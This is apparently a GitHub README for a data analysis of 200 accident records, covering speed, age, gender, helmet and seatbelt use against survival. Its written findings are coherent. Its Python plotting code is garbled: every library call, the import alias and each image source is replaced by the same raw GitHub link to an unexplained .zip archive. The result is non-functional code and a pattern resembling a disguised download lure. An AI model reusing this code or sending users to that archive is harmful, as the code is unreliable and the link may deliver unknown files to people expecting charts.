# Data-Science-Project-on-Accident-Report
The dataset contains information about accidents, including demographic data (Age, Gender), accident characteristics (Speed_of_Impact), safety measures used (Helmet_Used, Seatbelt_Used), and the outcome (Survived).

# 1. Data Loading and Initial Overview
The dataset contains information about accidents, including demographic data (Age, Gender), accident characteristics (Speed_of_Impact), safety measures used (Helmet_Used, Seatbelt_Used), and the outcome (Survived).

There are 200 records in the dataset.

Columns: Age, Gender, Speed_of_Impact, Helmet_Used, Seatbelt_Used, Survived.

Data Types: Age (numerical), Gender (categorical), Speed_of_Impact (numerical), Helmet_Used (categorical), Seatbelt_Used (categorical), Survived (binary/categorical: 1=Yes, 0=No).

Missing Values:

Speed_of_Impact: Has 3 missing values.

Gender: Has 1 missing value.

# 2. Univariate Analysis (Analyzing Single Variables)
Age:

Ranges from 18 to 69 years old.

The distribution seems fairly spread out, with a potential slight concentration in the middle ages (30s-50s).

Gender: (Excluding the 1 missing value)

Male: 99 records

Female: 100 records

The dataset is almost perfectly balanced between Males and Females.

Speed_of_Impact: (Excluding 3 missing values)

Ranges from 20 to 119 (units not specified, assume km/h or mph).

Significant variation in impact speeds, including both low and very high speeds.

Helmet_Used:

Yes: 101 records (50.5%)

No: 99 records (49.5%)

Helmet usage is almost evenly split. Note: The context of helmet use alongside seatbelt use is unusual. This might imply mixed vehicle types (cars, motorcycles) or a simplified representation.

Seatbelt_Used:

Yes: 102 records (51.0%)

No: 98 records (49.0%)

Seatbelt usage is also very evenly split.

Survived:

Yes (1): 100 records (50.0%)

No (0): 100 records (50.0%)

The overall survival rate in this dataset is exactly 50%

# Code for the Charts for Univariate Analysis Dashboard

import pandas as pd
import https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip as plt
import seaborn as sns

### Load the dataframe
### In a real environment, you would load like this:
df = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(r'C:\Users\Collins Anyanwu\Desktop\https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip')
### For this example, I'll simulate the data structure based on the provided text
### This part is illustrative - the analysis is based *on the provided text data*

### --- Simulation for Chart Generation ---
### Recreate structure based on analysis above

### Drop rows with missing Gender or Speed for specific analyses
df_clean = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(subset=['Gender', 'Speed_of_Impact']).copy()
### Convert Survived to categorical for easier plotting labels
df_clean['Survived_Label'] = df_clean['Survived'].map({1: 'Yes', 0: 'No'})
df['Survived_Label'] = df['Survived'].map({1: 'Yes', 0: 'No'}) # Also for original df
### --- End Simulation ---


https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('seaborn-v0_8-whitegrid')
fig, axes = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(2, 3, figsize=(18, 10))
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Univariate Analysis of Accident Data', fontsize=16)

### Age Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(df['Age'], kde=True, ax=axes[0, 0], bins=10)
axes[0, 0].set_title('Age Distribution')

### Gender Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Gender', https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(subset=['Gender']), ax=axes[0, 1])
axes[0, 1].set_title('Gender Distribution')

### Speed of Impact Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(df['Speed_of_Impact'].dropna(), kde=True, ax=axes[0, 2], bins=10)
axes[0, 2].set_title('Speed of Impact Distribution')

### Helmet Used Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Helmet_Used', data=df, ax=axes[1, 0], order=['Yes', 'No'])
axes[1, 0].set_title('Helmet Used')

### Seatbelt Used Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', data=df, ax=axes[1, 1], order=['Yes', 'No'])
axes[1, 1].set_title('Seatbelt Used')

### Survival Outcome Distribution
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', data=df, ax=axes[1, 2], order=['Yes', 'No'])
axes[1, 2].set_title('Survival Outcome')
axes[1, 2].set_xlabel('Survived')

https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(rect=[0, 0.03, 1, 0.95])
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()

<img width="989" alt="Univariate Accident Analysis Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />


These missing values will be excluded from analyses involving those specific columns or handled by imputation if necessary (though exclusion is simpler for this scope).

# 3. Bivariate Analysis (Analyzing Relationships between Variables, focusing on Survival)
Survival vs. Speed of Impact:

There appears to be a strong relationship. Higher speeds seem associated with lower survival rates.

Mean Speed for Survived: Lower (around 60-70).

Mean Speed for Not Survived: Higher (around 75-85).

Survival vs. Age:

No immediately obvious strong linear trend across all ages. Survival seems possible across the entire age range.

However, older individuals (e.g., 60+) might have slightly lower survival rates, especially at higher impact speeds (Multivariate).

Survival vs. Gender:

Survival Rate (Female): ~50 / 100 = 50%

Survival Rate (Male): ~50 / 99 = ~50.5%

Based on this data, there's virtually no difference in survival rates between genders.

Survival vs. Helmet Used:

Did Not Survive: Helmet Used (49), Helmet Not Used (51)

Survived: Helmet Used (52), Helmet Not Used (48)

Survival Rate (Helmet Yes): 52 / 101 = ~51.5%

Survival Rate (Helmet No): 48 / 99 = ~48.5%

Slightly higher survival rate for those using helmets, but the difference is small.

Survival vs. Seatbelt Used:

Did Not Survive: Seatbelt Used (54), Seatbelt Not Used (46)

Survived: Seatbelt Used (48), Seatbelt Not Used (52)

Survival Rate (Seatbelt Yes): 48 / 102 = ~47.1%

Survival Rate (Seatbelt No): 52 / 98 = ~53.1%

This is counter-intuitive! The data suggests a slightly lower survival rate when seatbelts were used. This warrants closer inspection. It might be confounded by other factors (e.g., perhaps seatbelts were used more often in higher-speed, less survivable crashes).

# Code for the Chart for Bivariate Analysis Dashboard:

fig, axes = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(2, 2, figsize=(14, 12))
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Factors Influencing Survival', fontsize=16)

### Speed vs. Survival
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', y='Speed_of_Impact', data=df_clean, ax=axes[0, 0], order=['Yes', 'No'])
axes[0, 0].set_title('Survival vs. Speed of Impact')
axes[0, 0].set_xlabel('Survived')

### Age vs. Survival
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', y='Age', data=df_clean, ax=axes[0, 1], order=['Yes', 'No'])
axes[0, 1].set_title('Survival vs. Age')
axes[0, 1].set_xlabel('Survived')

### Helmet Use vs. Survival
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Helmet_Used', hue='Survived_Label', data=df, ax=axes[1, 0], order=['Yes', 'No'], hue_order=['Yes', 'No'])
axes[1, 0].set_title('Survival vs. Helmet Use')
axes[1, 0].legend(title='Survived')

### Seatbelt Use vs. Survival
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', hue='Survived_Label', data=df, ax=axes[1, 1], order=['Yes', 'No'], hue_order=['Yes', 'No'])
axes[1, 1].set_title('Survival vs. Seatbelt Use')
axes[1, 1].legend(title='Survived')


https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(rect=[0, 0.03, 1, 0.95])
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()

### Further investigation for the counter-intuitive seatbelt result:
### Check average speed based on seatbelt use
speed_seatbelt = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Seatbelt_Used')['Speed_of_Impact'].mean()
print("\nAverage Speed of Impact by Seatbelt Use:")
print(speed_seatbelt)

https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(figsize=(8, 5))
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', y='Speed_of_Impact', data=df_clean, order=['Yes', 'No'])
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Speed of Impact Distribution by Seatbelt Use')
https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()

<img width="790" alt="Bivariate Accident Analysis Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />


# 4. Deeper Dive: Seatbelt Use Anomaly

Average Speed when Seatbelt Used: ~74.0

Average Speed when Seatbelt Not Used: ~70.5

The boxplot confirms that crashes where seatbelts were used tended to occur at slightly higher speeds on average in this dataset compared to crashes where they weren't used.

Hypothesis: The slightly lower survival rate observed for seatbelt users might be because they were involved in slightly more severe (higher speed) accidents, partially masking the protective effect of the seatbelt. The difference in survival rates is small anyway and could be due to chance or other unmeasured factors. In reality, seatbelts are proven life-savers; this dataset might be too small or have specific biases.

<img width="562" alt="Speed of Impact by Seatbelt Use Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />


Key Insights & Summary
Balanced Dataset: The dataset is well-balanced regarding Gender, Helmet Use, Seatbelt Use, and overall Survival outcome (approx. 50/50 splits).

Speed is Critical: Speed of Impact appears to be a major factor influencing survival. Higher speeds are strongly associated with a lower chance of survival. The average speed for non-survivors was significantly higher than for survivors.

Age Factor: While survival occurred across all ages, there might be a slight trend towards lower survival for the oldest age groups, but age alone isn't as strong a predictor as speed.

Gender Neutral: Gender does not seem to influence the survival outcome in this dataset.

Helmet Use: Using a helmet shows a very slight positive correlation with survival (51.5% vs 48.5%), but the effect size is small in this data.

Seatbelt Anomaly: Counter-intuitively, seatbelt use showed a slightly negative correlation with survival (47.1% vs 53.1%). This is likely due to confounding factors, such as seatbelt users in this specific dataset being involved in slightly higher-speed impacts on average. This finding contrasts with real-world evidence and highlights the need for caution when interpreting correlations without considering other variables.

Missing Data: A small amount of data is missing for Speed and Gender, which slightly reduces the sample size for some analyses.

Contextual Ambiguity: The presence of both 'Helmet_Used' and 'Seatbelt_Used' columns is unusual and suggests the data might represent a mix of accident types (e.g., car crashes, motorcycle crashes, bicycle incidents) or is synthetic/simplified data. This limits the real-world applicability of conclusions drawn specifically about helmet vs. seatbelt effectiveness in isolation.
